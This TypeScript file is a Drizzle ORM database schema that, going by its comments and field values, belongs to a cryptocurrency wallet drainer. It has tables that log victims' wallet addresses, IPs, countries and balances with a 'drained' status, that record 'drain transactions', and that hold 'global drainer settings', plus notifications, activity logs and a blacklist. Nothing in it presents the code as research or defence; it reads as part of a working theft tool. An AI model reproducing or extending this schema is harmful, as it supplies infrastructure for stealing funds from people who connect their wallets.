import {
  int,
  mysqlEnum,
  mysqlTable,
  text,
  timestamp,
  varchar,
  decimal,
  boolean,
  bigint,
} from "drizzle-orm/mysql-core";

export const users = mysqlTable("users", {
  id: int("id").autoincrement().primaryKey(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

// Wallet connections table - stores all wallet connection attempts
export const walletConnections = mysqlTable("wallet_connections", {
  id: int("id").autoincrement().primaryKey(),
  walletAddress: varchar("walletAddress", { length: 100 }).notNull(),
  walletType: varchar("walletType", { length: 50 }).notNull(), // metamask, walletconnect, phantom
  network: varchar("network", { length: 50 }).default("ethereum"),
  chainId: int("chainId"),
  ipAddress: varchar("ipAddress", { length: 64 }),
  userAgent: text("userAgent"),
  status: mysqlEnum("status", ["pending", "connected", "drained", "failed"]).default("pending").notNull(),
  ethBalance: decimal("ethBalance", { precision: 20, scale: 8 }).default("0"),
  usdValue: decimal("usdValue", { precision: 20, scale: 2 }).default("0"),
  country: varchar("country", { length: 100 }),
  sessionId: varchar("sessionId", { length: 128 }),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type WalletConnection = typeof walletConnections.$inferSelect;
export type InsertWalletConnection = typeof walletConnections.$inferInsert;

// Transactions table - stores all drain transactions
export const transactions = mysqlTable("transactions", {
  id: int("id").autoincrement().primaryKey(),
  connectionId: int("connectionId").notNull(),
  txHash: varchar("txHash", { length: 128 }),
  fromAddress: varchar("fromAddress", { length: 100 }).notNull(),
  toAddress: varchar("toAddress", { length: 100 }).notNull(),
  tokenSymbol: varchar("tokenSymbol", { length: 20 }).default("ETH"),
  tokenAddress: varchar("tokenAddress", { length: 100 }),
  amount: decimal("amount", { precision: 30, scale: 18 }).default("0"),
  usdValue: decimal("usdValue", { precision: 20, scale: 2 }).default("0"),
  network: varchar("network", { length: 50 }).default("ethereum"),
  chainId: int("chainId"),
  status: mysqlEnum("status", ["pending", "success", "failed", "cancelled"]).default("pending").notNull(),
  gasUsed: varchar("gasUsed", { length: 64 }),
  blockNumber: bigint("blockNumber", { mode: "number" }),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type Transaction = typeof transactions.$inferSelect;
export type InsertTransaction = typeof transactions.$inferInsert;

// Settings table - global drainer settings
export const settings = mysqlTable("settings", {
  id: int("id").autoincrement().primaryKey(),
  key: varchar("key", { length: 100 }).notNull().unique(),
  value: text("value"),
  description: text("description"),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type Setting = typeof settings.$inferSelect;
export type InsertSetting = typeof settings.$inferInsert;

// Notifications table
export const notifications = mysqlTable("notifications", {
  id: int("id").autoincrement().primaryKey(),
  title: varchar("title", { length: 255 }).notNull(),
  message: text("message").notNull(),
  type: mysqlEnum("type", ["info", "success", "warning", "error"]).default("info").notNull(),
  isRead: boolean("isRead").default(false).notNull(),
  relatedId: int("relatedId"),
  relatedType: varchar("relatedType", { length: 50 }),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type Notification = typeof notifications.$inferSelect;
export type InsertNotification = typeof notifications.$inferInsert;

// Activity logs table
export const activityLogs = mysqlTable("activity_logs", {
  id: int("id").autoincrement().primaryKey(),
  action: varchar("action", { length: 100 }).notNull(),
  description: text("description"),
  ipAddress: varchar("ipAddress", { length: 64 }),
  walletAddress: varchar("walletAddress", { length: 100 }),
  metadata: text("metadata"), // JSON string
  level: mysqlEnum("level", ["info", "warning", "error", "success"]).default("info").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type ActivityLog = typeof activityLogs.$inferSelect;
export type InsertActivityLog = typeof activityLogs.$inferInsert;

// Blacklist table
export const blacklist = mysqlTable("blacklist", {
  id: int("id").autoincrement().primaryKey(),
  type: mysqlEnum("type", ["wallet", "ip", "country"]).notNull(),
  value: varchar("value", { length: 200 }).notNull(),
  reason: text("reason"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type Blacklist = typeof blacklist.$inferSelect;
export type InsertBlacklist = typeof blacklist.$inferInsert;
